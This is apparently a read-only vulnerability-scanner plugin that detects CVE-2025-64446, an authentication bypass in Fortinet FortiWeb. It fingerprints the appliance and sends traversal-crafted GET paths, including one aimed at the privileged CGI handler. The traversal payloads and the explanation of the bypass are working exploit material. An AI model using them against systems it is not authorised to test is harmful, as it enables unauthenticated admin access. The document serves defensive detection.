"""CVE-2025-64446 — Fortinet FortiWeb authentication bypass via path traversal.

FortiWeb (Fortinet's web application firewall appliance) exposes a management
HTTP/HTTPS interface. A path-traversal in the API router lets an unauthenticated
request reach the internal CGI handler by prefixing a *valid* API path
(``/api/v2.0/cmdb/...``) and then traversing back down to the privileged CGI
endpoint. The router authorises the request against the harmless API prefix it
sees first, but the traversal silently re-targets the request at an
administrative handler — yielding full admin access with no credentials.

Added to the CISA KEV catalog in November 2025; active exploitation was observed
from October 2025.

This probe is BENIGN and read-only. It never performs the privileged action
behind the traversal (no user creation, no config write). It only:

    1. GET /                          — and a couple of well-known FortiWeb paths
                                        to fingerprint the appliance (login page
                                        title, ``Server`` header, FortiWeb-specific
                                        markers).
    2. GET /api/v2.0/cmdb/system/status
                                      — the *authenticated* status endpoint. On a
                                        sane appliance this is 401/403 without a
                                        session token.
    3. GET <traversal>/system/status  — the same status data reached through the
                                        traversal-crafted path. If the traversal
                                        path returns 200 with the status JSON while
                                        the direct path returned 401/403, the auth
                                        bypass is confirmed: we read privileged data
                                        without a session.

Severity:
    * HIGH   — FortiWeb fingerprinted AND the traversal path returned privileged
               data (200 + status JSON) that the direct, authenticated path
               refused (401/403). The auth bypass is confirmed read-only.
    * MEDIUM — the host fingerprints as FortiWeb but the bypass could not be
               confirmed on this probe (patched, filtered, or a layout change) —
               a candidate worth a manual check.
    * none   — not FortiWeb, or the traversal is correctly rejected and no
               privileged data leaked.

[Worker decision: plugin filename is cve_2025_64446.py (underscores) because the
runner discovers plugins via importlib and module names cannot contain hyphens.
The canonical CVE id lives in metadata["vuln_id"], matching the existing
cve_2009_3548.py / cve_2024_23897.py / cve_2025_55752.py convention.]
"""

from __future__ import annotations

from typing import Any

import httpx

from miasma.core import Finding, Target

metadata = {
    "vuln_id": "CVE-2025-64446",
    "name": "Fortinet FortiWeb authentication bypass (path traversal)",
    "description": (
        "Fortinet FortiWeb exposes an API path traversal that bypasses "
        "authentication: a request prefixed with a valid /api/v2.0/cmdb/ path "
        "traverses to a privileged CGI handler, granting unauthenticated admin "
        "access. Confirmed read-only by reaching the system/status endpoint "
        "through the traversal that the direct endpoint refuses without a session."
    ),
    "confidence": "high",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2025-64446",
        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
    ],
    # HTTP-class management ports for FortiWeb; also the fallback when recon
    # found none. port_hint is the canonical field the runner reads to skip
    # irrelevant plugins; default_ports is kept as the in-probe fallback alias.
    "port_hint": [443, 80, 8443],
    "service_hint": ["http", "https"],
    "default_ports": [443, 80, 8443],
}

# The direct, authenticated status endpoint. Without a session this is 401/403
# on a sane appliance — that refusal is the control we compare the traversal
# against, so a 200 via traversal is unambiguously a bypass.
_DIRECT_STATUS_PATH = "/api/v2.0/cmdb/system/status"

# Traversal-crafted paths that, on a vulnerable FortiWeb, prefix a valid API
# path and then traverse to the privileged status handler. We try a small
# ordered set of well-known shapes; all are read-only GETs against the inert
# status endpoint. The valid ``/api/v2.0/cmdb`` prefix satisfies the router's
# authorisation check before the dot-segments re-target the request.
_TRAVERSAL_PATHS = (
    "/api/v2.0/cmdb/system/../system/status",
    "/api/v2.0/cmdb/..%2fsystem%2fstatus",
    "/api/v2.0/cmdb/system%2f..%2f..%2fcgi-bin/fwbcgi",
    "/api/v2.0/cmdb/%2e%2e/system/status",
)

# FortiWeb fingerprints. Any one in the Server header, a known cookie/marker, or
# the login page body marks the appliance (case-insensitive).
_FORTIWEB_MARKERS = ("fortiweb", "fortinet")

# Status JSON returned by the privileged endpoint carries these keys; their
# presence proves we got privileged data back, not a generic error/landing page.
_STATUS_MARKERS = ("serial", "version", "http_method", "build")

# TLS ports where we should speak https.
_TLS_PORTS = (443, 8443)

_TIMEOUT = 5.0


def _candidate_ports(target: Target) -> list[int]:
    """Prefer recon-discovered open HTTP-ish ports; else the defaults."""
    open_ports = target.open_ports()
    if open_ports:
        http_like = [
            port
            for port in open_ports
            if "http" in target.service(port).get("name", "").lower()
            or port in metadata["default_ports"]
        ]
        return http_like or open_ports
    return list(metadata["default_ports"])


def _scheme(port: int) -> str:
    return "https" if port in _TLS_PORTS else "http"


def _get(url: str) -> httpx.Response | None:
    """Benign GET; returns None on any transport error."""
    try:
        return httpx.get(
            url,
            timeout=_TIMEOUT,
            verify=False,
            follow_redirects=False,
        )
    except httpx.HTTPError:
        return None


def _server_header(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    return resp.headers.get("server", "")


def _body(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text
    except (UnicodeDecodeError, httpx.HTTPError):
        return ""


def _is_fortiweb(resp: httpx.Response | None) -> bool:
    """True when the response fingerprints a FortiWeb appliance.

    We look across the Server header, the Set-Cookie header (FortiWeb sets
    appliance-specific cookies), and the response body (login page markers).
    """
    if resp is None:
        return False
    haystack = (
        _server_header(resp)
        + " "
        + resp.headers.get("set-cookie", "")
        + " "
        + _body(resp)
    ).lower()
    return any(marker in haystack for marker in _FORTIWEB_MARKERS)


def _looks_like_status(resp: httpx.Response) -> bool:
    """True when the body looks like the privileged status JSON, not a stub."""
    body = _body(resp).lower()
    return any(marker in body for marker in _STATUS_MARKERS)


def probe(target: Target) -> Finding | None:
    medium_evidence: dict[str, Any] | None = None

    for port in _candidate_ports(target):
        base = f"{_scheme(port)}://{target.host}:{port}"

        # 1. Fingerprint: is this a FortiWeb appliance at all? Check the root and
        #    the well-known login page; either marker is enough.
        root = _get(f"{base}/")
        login = _get(f"{base}/login")
        fortiweb = _is_fortiweb(root) or _is_fortiweb(login)
        if not fortiweb:
            # Not a FortiWeb host — never flag, even on odd responses.
            continue

        server = _server_header(root) or _server_header(login)

        # 2. Establish the control: the direct, authenticated status endpoint
        #    should refuse us (401/403) without a session. If it answers 200
        #    outright the appliance is wide open by misconfig, not this CVE —
        #    but a confirmed traversal bypass is still the stronger signal, so
        #    we only treat a refusing direct path as a clean control.
        direct = _get(f"{base}{_DIRECT_STATUS_PATH}")
        direct_status = direct.status_code if direct is not None else None
        direct_refused = direct_status in (401, 403)

        # 3. Attempt to read privileged status data through traversal shapes.
        for path in _TRAVERSAL_PATHS:
            resp = _get(f"{base}{path}")
            if resp is None:
                continue
            status = resp.status_code

            # Correctly rejected — keep trying other shapes / ports.
            if status in (401, 403, 404):
                continue

            if status == 200 and _looks_like_status(resp) and direct_refused:
                # Bypass confirmed: privileged data via traversal that the
                # direct path refused without a session.
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="high",
                    evidence={
                        "base_url": base,
                        "traversal_path": path,
                        "traversal_status": status,
                        "direct_path": _DIRECT_STATUS_PATH,
                        "direct_status": direct_status,
                        "server_header": server,
                    },
                    description=metadata["description"],
                )

            # FortiWeb fingerprinted and a traversal path answered with a
            # non-401/403/404 status, but the bypass wasn't cleanly confirmed
            # (no status markers, or the direct path didn't refuse). Remember
            # the first such hit as a MEDIUM candidate; a confirmed HIGH on a
            # later path/port still wins.
            if medium_evidence is None:
                medium_evidence = {
                    "base_url": base,
                    "traversal_path": path,
                    "traversal_status": status,
                    "direct_path": _DIRECT_STATUS_PATH,
                    "direct_status": direct_status,
                    "server_header": server,
                    "note": (
                        "FortiWeb fingerprinted and a traversal path returned a "
                        "non-401/403/404 status, but the authentication bypass "
                        "was not confirmed (no privileged status markers, or the "
                        "direct endpoint did not refuse) — manual check "
                        "recommended."
                    ),
                }

    if medium_evidence is not None:
        return Finding(
            vuln_id=metadata["vuln_id"],
            host=target.host,
            confidence="medium",
            evidence=medium_evidence,
            description=metadata["description"],
        )

    return None
